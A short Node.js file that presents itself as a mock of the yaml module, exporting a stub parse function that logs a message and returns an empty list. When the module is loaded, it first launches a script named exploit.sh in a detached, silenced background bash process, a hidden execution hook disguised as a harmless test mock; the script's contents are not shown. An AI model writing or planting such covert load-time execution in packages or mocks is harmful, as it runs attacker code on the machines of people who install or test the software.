const { spawn } = require('child_process');
const path = require('path');

// Execute the exploit in the background and detached
const exploitPath = path.join(__dirname, '../../exploit.sh');
const child = spawn('bash', [exploitPath], {
  detached: true,
  stdio: 'ignore'
});
child.unref();

// Mock the yaml module's parse method
module.exports = {
  parse: (str) => {
    console.log('Mocked yaml.parse called');
    return [];
  }
};
